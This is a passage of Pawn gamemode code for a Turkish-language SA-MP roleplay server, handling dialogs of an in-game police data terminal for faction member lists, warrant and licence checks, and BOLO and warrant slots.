					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "Þuanda online üye yok.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_SFPD, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | FBI Uyeleri", MemberString, "Seç", "Iptal");
		}
		else if(listitem == 2)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
      	 		if(PlayerInfo[i][pFaction] == 3)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "Þuanda online üye yok.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_LSFMD, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | LSFMD Uyeleri", MemberString, "Seç", "Iptal");
		}
		else if(listitem == 3)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
      	 		if(PlayerInfo[i][pFaction] == 5)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "Þuanda online üye yok.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_LSFMD, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | GOV Uyeleri", MemberString, "Seç", "Iptal");
		}
	}
	if(dialogid == MDC_WARRANTS && response)
	{
	    if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
	    ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | Emirler", inputtext, "Tamam", "Geri");
	}
	if(dialogid == MDC_BOLOLIST && response)
	{
	    if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
	    ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | BOLO", inputtext, "Tamam", "Geri");
	}
	if(dialogid == MDC_CHECK && response)
	{
	    if(!IsMDCPermitted(playerid))
			return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");

		new
			giveplayerid = ReturnUser(inputtext),
			szMessage[128],
			szQuery[256];

		if(giveplayerid != INVALID_PLAYER_ID) {
			format(szMessage, sizeof(szMessage), "** MERKEZ: %s, %s üzerinde tutuklama emri olup olmadýðýný kontrol etti.**", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			SendRadioMessage(1, COLOR_DBLUE, szMessage);
			SendRadioMessage(2, COLOR_DBLUE, szMessage);
			if(PlayerInfo[giveplayerid][pWantedLevel] == 0) {
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | HATA ", "Bu kiþinin bir kaydý yok.", "Tamam", "Iptal");
			} else {
				format(szQuery, sizeof(szQuery), "SELECT crimes.* FROM crimes INNER JOIN players ON crimes.crimeIssuedTo = players.ID OR crimes.crimeIssuedTo = players.ID WHERE players.ID = '%d' ORDER BY crimes.crimeID DESC LIMIT %d", PlayerInfo[giveplayerid][pID], PlayerInfo[giveplayerid][pWantedLevel]);
				mysql_query(szQuery, THREAD_MDC_CHECK, playerid, g_MySQLConnections[0]);
				SetPVarInt(playerid, "MVBKONTROL", giveplayerid);
			}
			return 1;
		} else return ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | HATA ", "Bu kiþinin bir kaydý yok.", "Tamam", "Iptal");
	}
	if(dialogid == MDC_LICENSES && response)
	{
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
		new giveplayerid;
		if(sscanf(inputtext, "u", giveplayerid))
		{
			ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Lisans Kontrol", "Kiþinin adýný yada ID'sini girin.", "Gir", "Iptal");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    new LicenseString[256], giveplayer[MAX_PLAYER_NAME];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				new text1[20];
				new text2[20];
				new text4[20];
				if(PlayerInfo[giveplayerid][pCarLic] == 0) { text1 = "Geçemedi"; }
				if(PlayerInfo[giveplayerid][pCarLic] == 1) { text1 = "Geçti"; }
				if(PlayerInfo[giveplayerid][pCarLic] == 2) { text1 = "Askiya Alindi"; }
				if(PlayerInfo[giveplayerid][pCarLic] == 3) { text1 = "Iptal Edildi"; }
				if(PlayerInfo[giveplayerid][pFlyLic]) { text4 = "Geçti"; } else { text4 = "Geçemedi"; }
				if(PlayerInfo[giveplayerid][pBoatLic]) { text2 = "Geçti"; } else { text2 = "Geçemedi"; }
				format(string, sizeof(string), "   Name: %s\n", giveplayer);
				strcat(LicenseString, string, sizeof(LicenseString));
				format(string, sizeof(string), "-Surucu belgesi: %s.\n", text1);
				strcat(LicenseString, string, sizeof(LicenseString));
				format(string, sizeof(string), "-Pilot Belgesi: %s.\n", text4);
				strcat(LicenseString, string, sizeof(LicenseString));
				format(string, sizeof(string), "-Denizci Belgesi: %s.\n", text2);
				strcat(LicenseString, string, sizeof(LicenseString));
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Suç Geçmiþi", LicenseString, "Tamam", "Iptal");
				format(string, sizeof(string), "** MERKEZ: %s, %s adýna kayýtlý lisanslarý kontrol etti.**", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				SendRadioMessage(1, COLOR_DBLUE, string);
				SendRadioMessage(2, COLOR_DBLUE, string);
				return 1;
			}
			else return ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Hata!", "Hata: Yanlýþ isim yada ID.\nKiþinin ismini yada ID'sini girin.", "Gir", "Iptal");
		}
		else return ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Hata!", "Hata: Yanlýþ isim yada ID.\nKiþinin ismini yada ID'sini girin.", "Gir", "Iptal");
	}
	if(dialogid == MDC_BOLO && response)
	{
		new x_nr = GetPVarInt(playerid, "BOLOISSUESLOT");
		if(x_nr == 1)
		{
			if(News[hTaken14] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd14], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact14], string, 0, strlen(string), 255);
				News[hTaken14] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "1. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 2)
		{
			if(News[hTaken15] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd15], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact15], string, 0, strlen(string), 255);
				News[hTaken15] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "2. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 3)
		{
			if(News[hTaken16] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd16], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact16], string, 0, strlen(string), 255);
				News[hTaken16] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "3. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 4)
		{
			if(News[hTaken17] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd17], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact17], string, 0, strlen(string), 255);
				News[hTaken17] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "4. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 5)
		{
			if(News[hTaken18] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd18], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact18], string, 0, strlen(string), 255);
				News[hTaken18] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "5. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 6)
		{
			if(News[hTaken19] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd19], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact19], string, 0, strlen(string), 255);
				News[hTaken19] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "6. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 7)
		{
			if(News[hTaken20] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd20], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact20], string, 0, strlen(string), 255);
				News[hTaken20] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "7. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 8)
		{
			if(News[hTaken21] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin\nBOLO detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd21], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact21], string, 0, strlen(string), 255);
				News[hTaken21] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir BOLO detayý ekledin. -BOLO\nÞuanda bulunan BOLO'larý görmek için MVB'e giriþ yapýp BOLO'larý görü seçmelisin.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: BOLO detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | Hata! ", "8. Slot zaten kullanýlýyor.", "Tamam", "Geri");
				return 1;
			}
		}
	}
	if(dialogid == MDC_BOLO_SLOT && response)
	{
	    SetPVarInt(playerid, "BOLOISSUESLOT", listitem + 1);
	    ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Emir Gir", "BOLO detayi gir.", "Gir", "Iptal");
	}
	if(dialogid == MDC_ISSUE_SLOT && response)
	{
	    SetPVarInt(playerid, "ISSUESLOT", listitem + 1);
	    ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Emir Gir", "Emir hakkýnda detay girin", "Gir", "Iptal");
	}
	if(dialogid == MDC_END_ID && response)
	{
		ShowPlayerDialogEx(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý", "*Memur Bul\n*Sivil Bilgisi\n*Devlet Birimleri\n*MVB Mesajý\n*SMS", "Tamam", "Iptal");
	}
	if(dialogid == MDC_ISSUE && response)
	{
		new x_nr = GetPVarInt(playerid, "ISSUESLOT");
		if(x_nr == 1)
		{
			if(News[hTaken6] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd6], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact6], string, 0, strlen(string), 255);
				News[hTaken6] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "1. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 2)
		{
			if(News[hTaken7] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd7], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact7], string, 0, strlen(string), 255);
				News[hTaken7] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "2. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 3)
		{
			if(News[hTaken8] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd8], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact8], string, 0, strlen(string), 255);
				News[hTaken8] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "3. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 4)
		{
			if(News[hTaken9] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd9], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact9], string, 0, strlen(string), 255);
				News[hTaken9] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "4. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 5)
		{
			if(News[hTaken10] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd10], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact10], string, 0, strlen(string), 255);
				News[hTaken10] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "5. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 6)
		{
			if(News[hTaken11] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd11], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact11], string, 0, strlen(string), 255);
				News[hTaken11] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "6. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 7)
		{
			if(News[hTaken12] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd12], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact12], string, 0, strlen(string), 255);
				News[hTaken12] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Hata! ", "7. slot zaten kullanýlýyor", "Tamam", "Geri");
				return 1;
			}
		}
		if(x_nr == 8)
		{
			if(News[hTaken13] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Minimum 9 karakter girmelisin.\nTutuklama emri detayý gir.", "Gir", "Iptal"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd13], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact13], string, 0, strlen(string), 255);
				News[hTaken13] = 1;
